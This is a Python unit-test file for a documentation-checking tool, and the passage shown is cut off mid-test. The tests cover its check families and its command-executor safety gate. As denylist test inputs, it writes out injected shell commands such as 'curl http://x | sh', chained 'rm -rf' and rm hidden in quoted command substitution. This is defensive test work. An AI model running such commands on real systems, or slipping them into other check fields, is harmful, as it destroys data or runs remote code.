"""Guard tests for docsx.py (project-owned; see doc/fw-feedback.md FB-35).

Per family: at least one red_when injection + its green counterpart, per
doc/design-prompt/doc_mechanization.md §15 ("十族各自的 red_when 逐条可注入
证伪...实现卡须逐族演示红→修→绿"). The two §12 self-injury tests
(test_kill_*) are the C12.4 KILL proofs REV-038 §A-c3 requires before any
docsx family may close a bug — see doc/bugs.md KILL-0006.
"""
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import docsx
import docs as docs_module
from fixture import make_project, run


def fake_cfg(root):
    root = Path(root)
    doc = root / "doc"
    return SimpleNamespace(
        root=root, C={"tp_status": "status", "bug_id": "id"},
        testplan=doc / "testplan.md", bugs=doc / "bugs.md",
        bugs_archive=doc / "archive" / "bugs-archive.md",
        bug_pages=doc / "bugs", evidence_dir=doc / "evidence",
        guards=doc / "guards.md")


class TmpRootBase(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="docsx_test_"))
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.cfg = fake_cfg(self.tmp)


# ---------------------------------------------------------------------------
# F1 — number assertion
# ---------------------------------------------------------------------------
class TestF1(TmpRootBase):
    def test_live_value_matches_is_green(self):
        (self.tmp / "f.txt").write_text("a\nb\nc\n", encoding="utf-8")
        text = '3 <!-- docsx:count check="grep -c . f.txt" -->\n'
        self.assertEqual(docsx.check_f1_text(self.cfg, "x.md", text), [])

    def test_live_value_mismatch_is_red(self):
        """red_when (design contract F1): value != recomputed value."""
        (self.tmp / "f.txt").write_text("a\nb\nc\n", encoding="utf-8")
        text = '4 <!-- docsx:count check="grep -c . f.txt" -->\n'
        out = docsx.check_f1_text(self.cfg, "x.md", text)
        self.assertEqual(len(out), 1)
        self.assertIn("value mismatch", out[0][1])
        self.assertEqual(out[0][0], "x.md:1")

    def test_frozen_form_skips_value_recompare(self):
        (self.tmp / "f.txt").write_text("a\nb\nc\n", encoding="utf-8")
        # value (999) deliberately wrong for the live form, but the frozen
        # form only meta-checks — "as of <sha>" is never re-diffed.
        text = ('999 <!-- docsx:count frozen@abc123 '
               'check="grep -c . f.txt" -->\n')
        self.assertEqual(docsx.check_f1_text(self.cfg, "x.md", text), [])

    def test_check_attr_missing_is_red(self):
        text = "5 <!-- docsx:count -->\n"
        out = docsx.check_f1_text(self.cfg, "x.md", text)
        self.assertEqual(len(out), 1)
        self.assertIn("missing or empty", out[0][1])

    def test_check_attr_empty_is_red(self):
        text = '5 <!-- docsx:count check="" -->\n'
        out = docsx.check_f1_text(self.cfg, "x.md", text)
        self.assertIn("missing or empty", out[0][1])

    def test_meta_check_zero_hits_is_red(self):
        """FB-23's exact shape: a BRE that can never hit (no alternation) —
        exit 1, meta-check red regardless of the claimed value."""
        text = ('1 <!-- docsx:count '
               'check="grep -rc \'workflow/{a,b}/\' doc/" -->\n')
        out = docsx.check_f1_text(self.cfg, "x.md", text)
        self.assertEqual(len(out), 1)
        self.assertIn("meta-check failed", out[0][1])


# ---------------------------------------------------------------------------
# F2 — in-repo path existence
# ---------------------------------------------------------------------------
class TestF2(TmpRootBase):
    def test_existing_path_is_green(self):
        (self.tmp / "doc").mkdir()
        (self.tmp / "doc" / "spec.md").write_text("x", encoding="utf-8")
        text = "see `doc/spec.md` for details\n"
        self.assertEqual(docsx.check_f2_text(self.cfg, "README.md", text), [])

    def test_dead_path_is_red(self):
        """red_when (design contract F2): README.md gains a reference to a
        nonexistent workflow/ path."""
        text = "see `workflow/nonexistent.md` for details\n"
        out = docsx.check_f2_text(self.cfg, "README.md", text)
        self.assertEqual(len(out), 1)
        self.assertIn("workflow/nonexistent.md", out[0][1])

    def test_frozen_prefix_reference_does_not_misfire(self):
        """red_when's counter-example: a doc/evidence/ reference must NOT
        turn red even though the target file does not exist (FB-23)."""
        text = "see `doc/evidence/vX/gone.md` for details\n"
        self.assertEqual(docsx.check_f2_text(self.cfg, "README.md", text), [])

    def test_glob_token_with_matches_is_green(self):
        (self.tmp / "doc" / "bugs").mkdir(parents=True)
        (self.tmp / "doc" / "bugs" / "BUG-0001.md").write_text(
            "x", encoding="utf-8")
        text = "see `doc/bugs/*.md`\n"
        self.assertEqual(docsx.check_f2_text(self.cfg, "README.md", text), [])

    def test_glob_token_with_no_matches_is_red(self):
        # scripts/ (not one of the C1.3 frozen prefixes) so the glob's
        # zero-match verdict is what fires, not the frozen-prefix skip.
        text = "see `scripts/no_such_dir/*.py`\n"
        out = docsx.check_f2_text(self.cfg, "README.md", text)
        self.assertEqual(len(out), 1)
        self.assertIn("glob", out[0][1])


# ---------------------------------------------------------------------------
# F3 — bidirectional set assertion (docsx:bidiff marker)
# ---------------------------------------------------------------------------
class TestF3(TmpRootBase):
    def test_equal_sets_both_directions_empty_is_green(self):
        (self.tmp / "a.txt").write_text("x\ny\n", encoding="utf-8")
        (self.tmp / "b.txt").write_text("y\nx\n", encoding="utf-8")
        text = ('<!-- docsx:bidiff left="cat a.txt" right="cat b.txt" -->\n')
        self.assertEqual(docsx.check_f3_text(self.cfg, "x.md", text), [])

    def test_left_minus_right_nonempty_is_red(self):
        """red_when (design contract F3): a phantom line on the left side
        with nothing matching on the right -> left-right red."""
        (self.tmp / "a.txt").write_text("x\nghost\n", encoding="utf-8")
        (self.tmp / "b.txt").write_text("x\n", encoding="utf-8")
        text = ('<!-- docsx:bidiff left="cat a.txt" right="cat b.txt" -->\n')
        out = docsx.check_f3_text(self.cfg, "x.md", text)
        self.assertEqual(len(out), 1)
        self.assertIn("left-right", out[0][1])
        self.assertIn("ghost", out[0][1])

    def test_right_minus_left_nonempty_is_red(self):
        """red_when's other direction (design contract F3: "两个方向都进
        退出码", the BUG-0058 single-direction lesson applied here): a row
        deleted from the right side with nothing matching on the left."""
        (self.tmp / "a.txt").write_text("x\n", encoding="utf-8")
        (self.tmp / "b.txt").write_text("x\nextra\n", encoding="utf-8")
        text = ('<!-- docsx:bidiff left="cat a.txt" right="cat b.txt" -->\n')
        out = docsx.check_f3_text(self.cfg, "x.md", text)
        self.assertEqual(len(out), 1)
        self.assertIn("right-left", out[0][1])
        self.assertIn("extra", out[0][1])

    def test_empty_set_on_either_side_is_not_a_meta_check_failure(self):
        """F3's meta-check is narrower than F1's (design contract: "两侧
        命令均受 §12 执行器约束与 §F1 元检查（退出 0）") — only exit 0 is
        required, not non-empty stdout: an empty result set (e.g. zero
        orphans) is a legitimate, common outcome, not a failure."""
        (self.tmp / "a.txt").write_text("", encoding="utf-8")
        (self.tmp / "b.txt").write_text("", encoding="utf-8")
        text = ('<!-- docsx:bidiff left="cat a.txt" right="cat b.txt" -->\n')
        self.assertEqual(docsx.check_f3_text(self.cfg, "x.md", text), [])

    def test_denylisted_side_is_a_meta_check_failure(self):
        text = ('<!-- docsx:bidiff left="cat a.txt; rm -rf sim/out" '
               'right="cat a.txt" -->\n')
        out = docsx.check_f3_text(self.cfg, "x.md", text)
        self.assertEqual(len(out), 1)
        self.assertIn("meta-check failed", out[0][1])


# ---------------------------------------------------------------------------
# F4 — doc/guards.md guard table
# ---------------------------------------------------------------------------
class TestF4(TmpRootBase):
    def test_script_row_with_working_check_is_green(self):
        (self.tmp / "f.txt").write_text("hi\n", encoding="utf-8")
        rows = [{"id": "G-0001", "bugs": "BUG-0001", "type": "script",
                "paths": "f.txt", "check": "grep -q hi f.txt",
                "note": "n"}]
        viol, warns = docsx.check_f4(self.cfg, rows)
        self.assertEqual(viol, {})

    def test_new_checklist_row_is_red(self):
        """red_when (design contract F4): a new type: checklist row is red
        unless a baseline row exempts it (A-c5 exception channel == "the
        row's locus has a baseline row", checked by F10, not here)."""
        rows = [{"id": "G-0002", "bugs": "BUG-0002", "type": "checklist",
                "paths": "f.txt", "check": "-", "note": "n"}]
        viol, warns = docsx.check_f4(self.cfg, rows)
        self.assertIn("doc/guards.md:G-0002", viol)

    def test_non_ascii_paths_is_red(self):
        """red_when (design contract F4): paths cell with full-width
        parens (BUG-0061's exact pollution shape) -> red."""
        (self.tmp / "f.txt").write_text("hi\n", encoding="utf-8")
        rows = [{"id": "G-0003", "bugs": "BUG-0003", "type": "script",
                "check": "grep -q hi f.txt",
                "paths": "doc/milestone.md（M4/M5 节）", "note": "n"}]
        viol, warns = docsx.check_f4(self.cfg, rows)
        self.assertIn("doc/guards.md:G-0003:paths", viol)

    def test_script_row_with_empty_check_is_red(self):
        rows = [{"id": "G-0004", "bugs": "BUG-0004", "type": "script",
                "paths": "f.txt", "check": "-", "note": "n"}]
        viol, warns = docsx.check_f4(self.cfg, rows)
        self.assertIn("doc/guards.md:G-0004:check", viol)

    def test_zero_match_paths_token_is_a_warning_not_an_error(self):
        (self.tmp / "f.txt").write_text("hi\n", encoding="utf-8")
        rows = [{"id": "G-0005", "bugs": "BUG-0005", "type": "script",
                "check": "grep -q hi f.txt", "paths": "no/such/file.sv",
                "note": "n"}]
        viol, warns = docsx.check_f4(self.cfg, rows)
        self.assertEqual(viol, {})
        self.assertEqual(len(warns), 1)
        self.assertIn("zero matches", warns[0])


# ---------------------------------------------------------------------------
# F5 — orphan bidirectional (bug row <-> page, evidence file <-> reference)
# ---------------------------------------------------------------------------
class TestF5(TmpRootBase):
    def setUp(self):
        super().setUp()
        (self.tmp / "doc" / "archive").mkdir(parents=True, exist_ok=True)
        (self.tmp / "doc" / "bugs").mkdir(exist_ok=True)
        (self.tmp / "doc" / "bugs.md").write_text(
            "| id | status |\n| --- | --- |\n", encoding="utf-8")
        (self.tmp / "doc" / "archive" / "bugs-archive.md").write_text(
            "| id | status |\n| --- | --- |\n", encoding="utf-8")
        (self.tmp / "doc" / "testplan.md").write_text("# tp\n",
                                                       encoding="utf-8")

    def test_bug_row_with_page_is_green(self):
        (self.tmp / "doc" / "bugs.md").write_text(
            "| id | status |\n| --- | --- |\n| BUG-0001 | OPEN |\n",
            encoding="utf-8")
        (self.tmp / "doc" / "bugs" / "BUG-0001.md").write_text(
            "# BUG-0001\n", encoding="utf-8")
        self.assertEqual(docsx.check_f5_bug_pages(self.cfg), {})

    def test_bug_row_without_page_is_red(self):
        """red_when (design contract F5 == BUG-0067's own defect): a bug
        row with no doc/bugs/<id>.md page."""
        (self.tmp / "doc" / "bugs.md").write_text(
            "| id | status |\n| --- | --- |\n| BUG-0002 | OPEN |\n",
            encoding="utf-8")
        viol = docsx.check_f5_bug_pages(self.cfg)
        self.assertIn("bugs.md:BUG-0002", viol)

    def test_evidence_file_referenced_is_green(self):
        ev = self.tmp / "doc" / "evidence" / "v0.1.0"
        ev.mkdir(parents=True)
        (ev / "BUG-0001.log").write_text("log\n", encoding="utf-8")
        (self.tmp / "doc" / "bugs.md").write_text(
            "| id | status |\n| --- | --- |\n"
            "| BUG-0001 | CLOSED | doc/evidence/v0.1.0/BUG-0001.log |\n",
            encoding="utf-8")
        self.assertEqual(docsx.check_f5_evidence(self.cfg), {})

    def test_orphan_evidence_file_is_red(self):
        """red_when (design contract F5 == BUG-0060's own defect): a .log
        under doc/evidence/ that no bugs.md/testplan.md row cites."""
        ev = self.tmp / "doc" / "evidence" / "v0.1.0"
        ev.mkdir(parents=True)
        (ev / "orphan.log").write_text("log\n", encoding="utf-8")
        viol = docsx.check_f5_evidence(self.cfg)
        self.assertIn("evidence:doc/evidence/v0.1.0/orphan.log", viol)

    def test_dangling_evidence_reference_is_red(self):
        (self.tmp / "doc" / "bugs.md").write_text(
            "| id | status |\n| --- | --- |\n"
            "| BUG-0003 | CLOSED | doc/evidence/v9.9.9/ghost.log |\n",
            encoding="utf-8")
        viol = docsx.check_f5_evidence(self.cfg)
        self.assertIn("ref:doc/evidence/v9.9.9/ghost.log", viol)


# ---------------------------------------------------------------------------
# BUG-0053 — tool-marker leak (not an F-family; no baseline exemption)
# ---------------------------------------------------------------------------
class TestBug0053ToolMarkerLeak(unittest.TestCase):
    def test_clean_text_is_green(self):
        text = "normal prose, no markers here\n"
        self.assertEqual(docsx.check_tool_marker_leak("x.md", text), [])

    def test_whole_line_marker_is_red(self):
        """red_when #1 (REV-037/REV-038 §C two-use-case KILL): appending
        the marker as its own whole line -> red."""
        text = "some record text\n</invoke>\n"
        out = docsx.check_tool_marker_leak("x.md", text)
        self.assertEqual(len(out), 1)
        self.assertIn("</invoke>", out[0][1])

    def test_content_marker_whole_line_is_red(self):
        text = "some record text\n</content>\n"
        out = docsx.check_tool_marker_leak("x.md", text)
        self.assertEqual(len(out), 1)

    def test_marker_inside_fenced_code_block_stays_green(self):
        """red_when #2 (the two-use-case KILL's other half): the exact
        same string, quoted inside a fenced code block (as this file's
        own docstrings and doc/bugs/BUG-0053.md's narrative do), must NOT
        trip the check — substring/example quoting is not a leak."""
        text = "example:\n```\n</invoke>\n```\n"
        self.assertEqual(docsx.check_tool_marker_leak("x.md", text), [])

    def test_marker_as_substring_not_whole_line_is_green(self):
        """note: 判据是'行首起、整行仅由该标记构成'而非子串匹配— a line that
        merely mentions the marker as part of a longer sentence must not
        fire (REV-035's own text quotes these markers when discussing
        BUG-0053)."""
        text = "the tag `</invoke>` leaked into a record\n"
        self.assertEqual(docsx.check_tool_marker_leak("x.md", text), [])


# ---------------------------------------------------------------------------
# A-c2 — F4 migration leaves docs.py's fl_schema_enforce satisfied. Proven
# against the real `docs.check_fl_page` (canon, zero edits — this is the
# "give a zero-docs.py-changes compatible wiring" requirement itself,
# verified rather than merely asserted).
# ---------------------------------------------------------------------------
class TestAc2FlSchemaCompat(unittest.TestCase):
    def test_pointer_only_guard_section_satisfies_fl_schema(self):
        """A terminal-status detail page whose `## regression_guard` body
        is nothing but the one-line pointer this migration writes must
        still pass `check_fl_page`'s "section present and non-empty for
        terminal bugs" rule (docs.py:293-300) — the schema only checks
        non-empty, never the section's internal shape."""
        with tempfile.TemporaryDirectory() as d:
            page = Path(d) / "BUG-9001.md"
            page.write_text(
                "# BUG-9001\n\n"
                "## symptom\nx\n\n## first_anomaly\nx\n\n"
                "## taxonomy\nTB_BUG\n\n## rca\nx\n\n## fix\nx\n\n"
                "## rerun\nx\n\n"
                "## regression_guard\n\n"
                "见 `doc/guards.md` G-9001（BUG-9001）。\n\n"
                "## similar\nx\n", encoding="utf-8")
            errors = []
            docs_module.check_fl_page(page, "CLOSED", errors)
            self.assertEqual(errors, [])

    def test_empty_guard_section_still_fails_fl_schema(self):
        """Negative control: an actually-empty section must still fail —
        proves the green case above is the pointer text doing the work,
        not a blanket pass-through."""
        with tempfile.TemporaryDirectory() as d:
            page = Path(d) / "BUG-9002.md"
            page.write_text(
                "# BUG-9002\n\n"
                "## symptom\nx\n\n## first_anomaly\nx\n\n"
                "## taxonomy\nTB_BUG\n\n## rca\nx\n\n## fix\nx\n\n"
                "## rerun\nx\n\n"
                "## regression_guard\n\n## similar\nx\n", encoding="utf-8")
            errors = []
            docs_module.check_fl_page(page, "CLOSED", errors)
            self.assertTrue(any("regression_guard" in e for e in errors))


# ---------------------------------------------------------------------------
# F7 — hardcoded snapshot phrase (warning only, REV-038 D-3)
# ---------------------------------------------------------------------------
class TestF7(unittest.TestCase):
    def test_snapshot_phrase_without_marker_or_pointer_warns(self):
        """red_when (as warning, D-3): no docsx marker, no make next/handoff
        pointer nearby."""
        text = "当前已改：workflow/a.md、workflow/b.md\n"
        warns = docsx.check_f7_text("README.md", text)
        self.assertEqual(len(warns), 1)

    def test_snapshot_phrase_with_make_next_pointer_is_silent(self):
        text = "当前已改：见 make next 输出、非静态枚举\n"
        self.assertEqual(docsx.check_f7_text("README.md", text), [])

    def test_snapshot_phrase_with_docsx_marker_is_silent(self):
        text = ('当前已改：N 处、 <!-- docsx:count check="echo 1" -->\n')
        self.assertEqual(docsx.check_f7_text("README.md", text), [])

    def test_f7_warning_never_reaches_the_error_list(self):
        """F7 is advisory-only (REV-038 D-3): collect_violations must keep
        it out of both the F1 and F2 violation dicts that F10 gates on."""
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            # Deliberately path-token-free so only F7 has an opinion here —
            # doc_mechanization.md's own F7 example (workflow/a.md,
            # workflow/b.md) is a case where the same text trips F2 too
            # (see doc/docsx-baseline.md BL-0012/BL-0013); that is F2 doing
            # its job, not this test's concern.
            (root / "README.md").write_text(
                "当前已改：一些内容、另一些内容\n", encoding="utf-8")
            cfg = fake_cfg(root)
            orig = docsx.LIVE_EXPLICIT
            docsx.LIVE_EXPLICIT = ("README.md",)
            try:
                viol, warns = docsx.collect_violations(cfg)
            finally:
                docsx.LIVE_EXPLICIT = orig
            self.assertEqual(viol["F1"], {})
            self.assertEqual(viol["F2"], {})
            self.assertEqual(len(warns), 1)


# ---------------------------------------------------------------------------
# F10 — baseline (bidirectional); pure-data tests, no filesystem needed
# ---------------------------------------------------------------------------
class TestF10(unittest.TestCase):
    def test_baselined_violation_is_suppressed(self):
        baseline = [{"id": "BL-0001", "family": "F2", "locus": "a.md:1:x",
                    "rev_ref": "REV-038 §B.1"}]
        viol = {"F2": {"a.md:1:x": "F2 dead in-repo path reference: x"}}
        self.assertEqual(docsx.check_f10(baseline, viol), [])

    def test_new_violation_not_in_baseline_is_red(self):
        """red_when (design contract F10): a new violation with no baseline
        row must fail the check."""
        viol = {"F2": {"a.md:1:x": "F2 dead in-repo path reference: x"}}
        errors = docsx.check_f10([], viol)
        self.assertEqual(len(errors), 1)
        self.assertIn("not in docsx-baseline.md", errors[0])

    def test_stale_baseline_row_must_be_pruned(self):
        """red_when: a baseline row whose violation no longer reproduces
        must itself turn the check red (BUG-0058's single-direction lesson,
        applied to docsx's own baseline)."""
        baseline = [{"id": "BL-0001", "family": "F2", "locus": "a.md:1:x",
                    "rev_ref": "REV-038 §B.1"}]
        errors = docsx.check_f10(baseline, {"F2": {}})
        self.assertEqual(len(errors), 1)
        self.assertIn("stale entry", errors[0])
        self.assertIn("BL-0001", errors[0])

    def test_empty_rev_ref_is_red(self):
        baseline = [{"id": "BL-0001", "family": "F2", "locus": "a.md:1:x",
                    "rev_ref": ""}]
        viol = {"F2": {"a.md:1:x": "F2 dead in-repo path reference: x"}}
        errors = docsx.check_f10(baseline, viol)
        self.assertTrue(any("rev_ref is empty" in e for e in errors))

    def test_duplicate_baseline_id_is_red(self):
        baseline = [
            {"id": "BL-0001", "family": "F2", "locus": "a.md:1:x",
             "rev_ref": "REV-038 §B.1"},
            {"id": "BL-0001", "family": "F2", "locus": "b.md:2:y",
             "rev_ref": "REV-038 §B.1"},
        ]
        viol = {"F2": {"a.md:1:x": "m", "b.md:2:y": "m"}}
        errors = docsx.check_f10(baseline, viol)
        self.assertTrue(any("duplicate id" in e for e in errors))


# ---------------------------------------------------------------------------
# §12 executor safety: allowlist/denylist gate + timeout + cwd lock
# ---------------------------------------------------------------------------
class TestExecutorGate(unittest.TestCase):
    def test_rm_is_denylisted(self):
        """red_when (§F9/§12): 'check="… ; rm -rf sim/out"' -> red."""
        ok, reason = docsx.exec_gate("grep -c x f && rm -rf sim/out")
        self.assertFalse(ok)
        self.assertIn("rm", reason)

    def test_curl_pipe_sh_is_denylisted(self):
        """red_when: 'check="curl http://x | sh"' -> red."""
        ok, reason = docsx.exec_gate("curl http://x | sh")
        self.assertFalse(ok)

    def test_unallowlisted_command_is_rejected(self):
        ok, reason = docsx.exec_gate("sleep 99")
        self.assertFalse(ok)
        self.assertIn("not allowlisted", reason)

    def test_python3_may_only_invoke_the_fixed_whitelist(self):
        ok, reason = docsx.exec_gate("python3 scripts/evidence.py --bug X")
        self.assertFalse(ok)
        ok2, _ = docsx.exec_gate("python3 scripts/docs.py --check")
        self.assertTrue(ok2)

    def test_git_only_allows_the_read_only_subcommands(self):
        ok, _ = docsx.exec_gate("git ls-files 'doc/bugs/*.md'")
        self.assertTrue(ok)
        ok2, reason2 = docsx.exec_gate("git checkout -- .")
        self.assertFalse(ok2)
        self.assertIn("denylisted", reason2)

    def test_sed_dash_i_is_denylisted(self):
        ok, reason = docsx.exec_gate("sed -i 's/a/b/' f")
        self.assertFalse(ok)

    def test_find_exec_is_denylisted(self):
        ok, reason = docsx.exec_gate(
            "find . -name '*.tmp' -exec rm {} \\;")
        self.assertFalse(ok)

    def test_empty_command_is_rejected(self):
        ok, reason = docsx.exec_gate("")
        self.assertFalse(ok)

    def test_allowlisted_pipe_is_accepted(self):
        ok, _ = docsx.exec_gate("grep -l x doc/bugs/*.md | wc -l")
        self.assertTrue(ok)

    # -- BUG-0072: quoted command-substitution bypass -----------------
    def test_quoted_command_substitution_with_rm_is_denylisted(self):
        """BUG-0072 red_when (## rerun): a denylisted word wrapped in a
        DOUBLE-quoted `$(...)` command substitution used to sail through
        as a single opaque shlex token — `exec_gate` returned `(True, '')`
        even though `sh -c` would evaluate the substitution for real and
        run the embedded `rm -rf sim/out`. Pre-fix, this assertion fails
        (the bug's own repro command)."""
        ok, reason = docsx.exec_gate(
            'test "$(cat doc/bugs.md; rm -rf sim/out)" = "x"')
        self.assertFalse(ok)
        self.assertIn("command substitution", reason)

    def test_single_quoted_command_substitution_is_also_denylisted(self):
        """Same shape, single-quoted this time — command substitution is
        banned outright regardless of which quote style wraps it (fix
        direction endorsed by BUG-0072 ## fix: §12's threat model never
        needs $(...)/backticks, so there is nothing to lose by banning
        the construct wholesale rather than trying to recursively
        re-parse whatever it contains)."""
        ok, reason = docsx.exec_gate("test '$(rm -rf sim/out)' = y")
        self.assertFalse(ok)
        self.assertIn("command substitution", reason)

    def test_backtick_command_substitution_is_denylisted(self):
        ok, reason = docsx.exec_gate("echo `rm -rf sim/out`")
        self.assertFalse(ok)
        self.assertIn("command substitution", reason)

    def test_nested_quoted_command_substitution_is_denylisted(self):
        """'嵌套' shape named in the fixer card: a $(...) inside another
        $(...) , still wrapped in quotes."""
        ok, reason = docsx.exec_gate(
            'echo "$(echo $(rm -rf sim/out))"')
        self.assertFalse(ok)
        self.assertIn("command substitution", reason)

    def test_quoted_denylisted_word_without_substitution_is_still_caught(self):
        """Second, independent defense: a denylisted word sitting inside a
        quoted string with no command substitution at all must still be
        rejected on its own merits — quoting alone must never hide a
        denylisted word (the fixer card's 单引号内/双引号内 requirement is
        broader than just the $(...) shape BUG-0072 happened to report)."""
        ok, reason = docsx.exec_gate('test "rm -rf x" = y')
        self.assertFalse(ok)
        self.assertIn("rm", reason)
        ok2, reason2 = docsx.exec_gate("test 'rm -rf x' = y")
        self.assertFalse(ok2)
        self.assertIn("rm", reason2)

    def test_quoted_glob_without_denylisted_content_stays_accepted(self):
        """Regression / no-allow-widening check: quoting by itself is not
        being punished — only denylisted content and command substitution
        are. A quoted glob with neither must remain green."""
        ok, _ = docsx.exec_gate("grep -l x 'doc/bugs/*.md'")
        self.assertTrue(ok)
        ok2, _ = docsx.exec_gate('git ls-files "doc/bugs/*.md"')
        self.assertTrue(ok2)


class TestExecutorRun(TmpRootBase):
    def test_timeout_is_enforced(self):
        """red_when: 'check="sleep 99"' -> timeout red. Exercises the raw
        runner directly (bypassing the allowlist gate, which would reject
        `sleep` on its own merits) so the timeout mechanism itself is
        proven, not just the gate's rejection of an unlisted command."""
        ok, out, reason = docsx._run("sleep 5", self.tmp, timeout=0.2)
        self.assertFalse(ok)
        self.assertIn("timeout", reason)

    def test_nonzero_exit_is_rejected(self):
        ok, out, reason = docsx._run("grep nonexistent_xyz /dev/null",
                                     self.tmp)
        self.assertFalse(ok)

    def test_empty_stdout_is_rejected(self):
        (self.tmp / "empty.txt").write_text("", encoding="utf-8")
        ok, out, reason = docsx._run("cat empty.txt", self.tmp)
        self.assertFalse(ok)
        self.assertIn("empty stdout", reason)

    def test_cwd_is_locked_to_repo_root(self):
        (self.tmp / "marker.txt").write_text("hi\n", encoding="utf-8")
        ok, out, reason = docsx._run("cat marker.txt", self.tmp)
        self.assertTrue(ok)
        self.assertEqual(out.strip(), "hi")


class TestExecutorKillSelfInjury(TmpRootBase):
    """C12.4 — the two self-injury proofs REV-038 §A-c3 requires before any
    docsx family may close a bug. doc/bugs.md KILL-0006 registers this."""

    def test_kill_a_rm_injection_rejected_and_zero_subprocess_calls(self):
        with mock.patch.object(subprocess, "run") as spy:
            ok, out, reason = docsx.exec_check(
                "grep -c x doc/bugs.md && rm -rf sim/out", self.cfg)
        self.assertFalse(ok)
        spy.assert_not_called()

    def test_kill_b_ref_field_never_reaches_the_executor(self):
        """Constructs a `ref:` line in the exact shape doc/bugs/BUG-0040.md
        carries (a live `make clean`), runs it through the F1/F2 scan
        pipeline, and asserts the executor is invoked zero times — proving
        architecturally that `ref:` text never reaches subprocess.run,
        not merely that this one string happens to look safe."""
        sample = "ref: cd sim && make clean && make lint-diff\n"
        with mock.patch.object(subprocess, "run") as spy:
            f1 = docsx.check_f1_text(self.cfg, "synthetic.md", sample)
            f2 = docsx.check_f2_text(self.cfg, "synthetic.md", sample)
        spy.assert_not_called()
        # No docsx:count/bidiff marker in the sample, so neither family
        # even has an opinion about it (further confirming nothing tried
        # to interpret the ref: text as a marker).
        self.assertEqual(f1, [])

    def test_kill_c_quoted_command_substitution_rejected_and_zero_subprocess_calls(self):
        """KILL-C (BUG-0072, `doc/bugs.md` KILL-0007): the shape that
        previously bypassed `exec_gate` — a denylisted word wrapped in a
        quoted `$(...)` command substitution — must now be rejected before
        `subprocess.run` is ever reached, same pre-exec proof shape as
        KILL-A. This is the third self-injury proof BUG-0072's ## rca
        found missing from KILL-0006's original two-proof coverage."""
        with mock.patch.object(subprocess, "run") as spy:
            ok, out, reason = docsx.exec_check(
                'test "$(cat doc/bugs.md; rm -rf sim/out)" = "x"', self.cfg)
        self.assertFalse(ok)
        spy.assert_not_called()

    def test_kill_proof_cli_reports_all_three(self):
        rc = docsx.cmd_kill_proof(self.cfg)
        self.assertEqual(rc, 0)


# ---------------------------------------------------------------------------
# End-to-end `--check` over a fixture project tree (subprocess, mirrors
# test_docs.py's convention).
# ---------------------------------------------------------------------------
class TestCheckIntegration(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="docsx_it_"))
        self.addCleanup(shutil.rmtree, self.tmp, True)
        make_project(self.tmp, profile="copilot")
        (self.tmp / "README.md").write_text("# fixture\n", encoding="utf-8")
        (self.tmp / "doc" / "fw-feedback.md").write_text(
            "# fw feedback\n", encoding="utf-8")
        (self.tmp / "doc" / "milestone.md").write_text(
            "# milestone\n", encoding="utf-8")
        (self.tmp / "doc" / "coverage-waivers.md").write_text(
            "# cw\n", encoding="utf-8")
        (self.tmp / "doc" / "docsx-baseline.md").write_text(
            "# docsx baseline\n\n| id | family | locus | rev_ref |\n"
            "| --- | --- | --- | --- |\n", encoding="utf-8")

    def test_clean_fixture_passes(self):
        cp = run(self.tmp, "docsx.py", "--check")
        self.assertEqual(cp.returncode, 0, cp.stdout + cp.stderr)
        self.assertIn("docsx-check passed", cp.stdout)

    def test_dead_reference_in_readme_fails_and_fix_restores_green(self):
        readme = self.tmp / "README.md"
        readme.write_text(
            "# fixture\n\nsee `workflow/nonexistent.md`\n", encoding="utf-8")
        cp = run(self.tmp, "docsx.py", "--check")
        self.assertEqual(cp.returncode, 1)
        self.assertIn("workflow/nonexistent.md", cp.stdout)
        readme.write_text("# fixture\n", encoding="utf-8")
        cp2 = run(self.tmp, "docsx.py", "--check")
        self.assertEqual(cp2.returncode, 0, cp2.stdout + cp2.stderr)

    def test_uncited_baseline_row_fails(self):
        (self.tmp / "doc" / "docsx-baseline.md").write_text(
            "# docsx baseline\n\n| id | family | locus | rev_ref |\n"
            "| --- | --- | --- | --- |\n"
            "| BL-0001 | F2 | README.md:3:workflow/ghost.md | |\n",
            encoding="utf-8")
        (self.tmp / "README.md").write_text(
            "# fixture\n\nsee `workflow/ghost.md`\n", encoding="utf-8")
        cp = run(self.tmp, "docsx.py", "--check")
        self.assertEqual(cp.returncode, 1)
        self.assertIn("rev_ref is empty", cp.stdout)

    def test_bug0053_tool_marker_two_use_case_end_to_end(self):
        """REV-037/REV-038 §C's two-use-case KILL for BUG-0053, run through
        the real `--check` CLI (not just the unit-level check function):
        appending the marker as a whole line -> red; the exact same string
        quoted inside a fenced code block -> stays green."""
        target = self.tmp / "doc" / "some_record.md"
        target.write_text("# a record\n\nnormal text\n", encoding="utf-8")
        cp0 = run(self.tmp, "docsx.py", "--check")
        self.assertEqual(cp0.returncode, 0, cp0.stdout + cp0.stderr)
        target.write_text("# a record\n\nnormal text\n</invoke>\n",
                          encoding="utf-8")
        cp1 = run(self.tmp, "docsx.py", "--check")
        self.assertEqual(cp1.returncode, 1)
        self.assertIn("tool-marker leak", cp1.stdout)
        target.write_text(
            "# a record\n\nnormal text\n```\n</invoke>\n```\n",
            encoding="utf-8")
        cp2 = run(self.tmp, "docsx.py", "--check")
        self.assertEqual(cp2.returncode, 0, cp2.stdout + cp2.stderr)

    def test_guards_cli_output_contract(self):
        """C13.3: `docsx.py --guards` must keep the exact output shape
        `docs.py --guards` used (design contract's own requirement) — a
        `\"== <bugs> guard (hit: ...) ==\"` header per match and a trailing
        count line — so every existing `grep '== BUG-XXXX guard'` consumer
        (REV-037 S1-S3, the dispatch SKILL self-check) keeps working."""
        (self.tmp / "doc" / "guards.md").write_text(
            "# guards\n\n| id | bugs | type | paths | check | note |\n"
            "| --- | --- | --- | --- | --- | --- |\n"
            "| G-0001 | BUG-0001 | checklist | tb/foo.sv | - | n |\n",
            encoding="utf-8")
        cp = run(self.tmp, "docsx.py", "--guards", "tb/foo.sv")
        self.assertEqual(cp.returncode, 0, cp.stdout + cp.stderr)
        self.assertIn("== BUG-0001 guard (hit: tb/foo.sv) ==", cp.stdout)
        self.assertIn("1 guard(s) matched", cp.stdout)

    def test_f4_new_checklist_row_fails_check(self):
        (self.tmp / "doc" / "guards.md").write_text(
